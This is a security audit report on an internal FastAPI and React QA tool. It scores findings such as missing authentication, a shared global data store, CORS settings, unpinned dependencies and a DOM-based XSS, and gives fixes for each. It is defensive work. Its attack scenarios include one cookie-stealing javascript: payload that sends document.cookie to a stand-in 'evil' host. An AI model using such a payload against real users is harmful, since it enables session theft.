# Security Audit — INFLUENCE QA (AgentQA)

**Date:** 2026-07-24
**Scope:** Full codebase (FastAPI backend + React 18 frontend)
**Stack:** Python 3.11 / FastAPI / Pydantic (unpinned); React 18.2 / raw fetch
**Context:** Early-stage internal QA tool, currently localhost-only, not yet deployed. No auth, no persistence (global in-memory store). These are known pre-Phase-5/6 gaps; findings are scored for the point at which this moves beyond localhost.
**Scanners:** none on PATH (pip-audit/gitleaks/trufflehog unavailable) — dependency + secrets findings are inferred, not tool-confirmed.

---

## Vulnerability Table

| ID | Severity | CVSS | Category | File:Line | Vulnerability | Confidence |
|----|----------|------|----------|-----------|---------------|------------|
| V1 | HIGH | 7.5 | A01 Broken Access Control / data isolation | services/store.py:20-21 | Global module-level `chat_history` list + `test_runs` dict shared across ALL requests/clients; zero session scoping — any client reads every other client's data | High — structurally confirmed, no per-request key exists |
| V2 | HIGH | 7.5 | A07 / A01 Missing authentication | main.py; routers/chat.py; routers/test_runs.py | Zero auth/authz on every endpoint; anyone who can reach the port reads all chat + triggers/reads all test runs | High — no auth dependency anywhere |
| V3 | MEDIUM | 5.4 | A05 Misconfiguration (CORS) | main.py:21-27 | `allow_credentials=True` with wildcard methods/headers; origins TODO-flagged for deploy — becomes exploitable if origins widened to `*` or a prod origin isn't set | High — code confirmed; exploit conditional on deploy config |
| V4 | MEDIUM | 5.4 | A03 DOM-based XSS (javascript: URI) | components/SiteViewer.jsx:31 | `<a href={url}>` renders unsanitized user input; `javascript:`/`data:` scheme in URL bar executes on click | Medium — real, but self-XSS (victim pastes into own bar); no cross-user vector today |
| V5 | MEDIUM | 5.3 | A06 Vulnerable/outdated components (supply chain) | requirements.txt:1-3 | `fastapi`, `uvicorn`, `pydantic` fully unpinned (no `==`, no lockfile) — non-reproducible builds, silent pull of a compromised/breaking version | Low — inferred, not scanner-confirmed |
| V6 | MEDIUM | 5.3 | A04 Resource exhaustion / DoS | test_runs.py:19-26; store.py:20-24 | No rate limiting; unbounded `test_case_ids`, unbounded `message` length, `chat_history` grows forever — memory exhaustion | Medium — plausible DoS, no bounds present |
| V7 | LOW | 3.1 | A05 Missing security headers | main.py | No CSP / HSTS / X-Frame-Options / X-Content-Type-Options | High — absence confirmed (low impact for API+localhost) |
| V8 | LOW | 3.7 | A02 Verbose error surface | main.py (no debug flag) | `/docs` + auto OpenAPI exposed; acceptable now, should be gated in prod | Medium — informational |

**No CRITICAL findings.** No hardcoded secrets, no SQL/command injection, no ORM (in-memory only), single-tenant today (multiTenant:false).

---

## Business Impact (HIGH findings)

**V1 — Shared global store, no isolation.** The moment a second user touches this tool (its stated near-term destiny as an internal tool), User B's chat sidebar shows User A's messages and every test run. QA chat may contain test data, deal names, staging URLs, internal workflow detail. Data-breach risk: MEDIUM (internal-sensitivity data, small record count). This is not a bug that appears later — it is baked into the module-level data structures and every read path (`get_history`, `list_test_runs`, `get_test_run` by guessable 8-char id).

**V2 — No authentication.** Anyone who can reach the host reads all data and launches unbounded background work. On localhost the blast radius is the local user; the risk crystallizes the instant the port is bound to a LAN/VPN/0.0.0.0 interface. Revenue/reputation risk: LOW now, MEDIUM post-deploy.

---

## Attack Scenarios

- **V1/V2:** An attacker (or merely a second legitimate user) on the same reachable network sends `GET /chat/history` and `GET /test-runs` with no credentials → receives the full cross-client chat log and every run's status/steps/logs. Run IDs are `uuid4()[:8]` (32 bits) so even the per-id endpoint is enumerable.
- **V3:** After deploy, if `allow_origins` is set to `*` (or left with `allow_credentials=True` alongside a reflected origin), a malicious page in the victim's browser issues credentialed cross-origin reads of chat/test data.
- **V4:** Attacker convinces a user to paste `javascript:fetch('//evil/'+document.cookie)` into the URL bar and click "Open in new tab" → script runs in the app origin. Limited: requires victim self-input; no stored/reflected path exists.

---

## Remediation (fix options)

**V1 — Session isolation.** A) Minimal: key the store by a per-client session id (cookie/header), replacing the two module globals with `dict[session_id, ...]`. B) Hardened (recommended before multi-user): move to the planned MongoDB store with an owner/session field on every record and filter every read by it — do this at the same time as V2 so identity and ownership land together. Effort: M.

**V2 — Auth.** A) Minimal pre-deploy gate: a single shared bearer token via FastAPI dependency on both routers. B) Hardened: real per-user auth (OAuth aligns with the existing `auth-stg.movingwalls.com` flow noted in SiteViewer) issuing the session identity V1 keys on. Effort: M–L.

**V3 — CORS.** Replace localhost list with the exact deployed frontend origin; keep `allow_credentials` only if cookies are actually used, and never pair it with `*`. Effort: S.

**V4 — URL sanitization.** Validate scheme before render/navigate: allow only `http:`/`https:` (`const safe = /^https?:$/.test(new URL(inputValue).protocol)`), else reject. Effort: S.

**V5 — Pin dependencies.** Pin `fastapi==`, `uvicorn[standard]==`, `pydantic==` to known-good versions and add a lockfile (`pip-compile`/`uv lock`); run `pip-audit` in CI. Effort: S.

**V6 — Limits.** Cap `message` length and `len(test_case_ids)` via Pydantic (`max_length`/`Field`); bound `chat_history`; add SlowAPI rate limiting once deployed. Effort: S.

---

## Risk Summary

- CRITICAL: 0 | HIGH: 2 | MEDIUM: 4 | LOW: 2
- Time-to-exploit HIGH findings: **immediate on first multi-user / non-localhost exposure** (not exploitable in the current single-user localhost posture).
- **Ship-before-deploy blockers:** V1 (session isolation), V2 (auth), V3 (CORS origins).
- **This sprint:** V4 (URL scheme allowlist), V5 (pin deps), V6 (input limits).
- Note: V1 and V2 should be built together — ownership filtering (V1) needs the identity that auth (V2) provides.

---

## Score

**Overall: AT_RISK** — 2 HIGH findings present (no CRITICAL). Acceptable for the current localhost single-user phase; V1/V2/V3 are hard blockers before this tool is exposed to any second user or non-loopback interface.
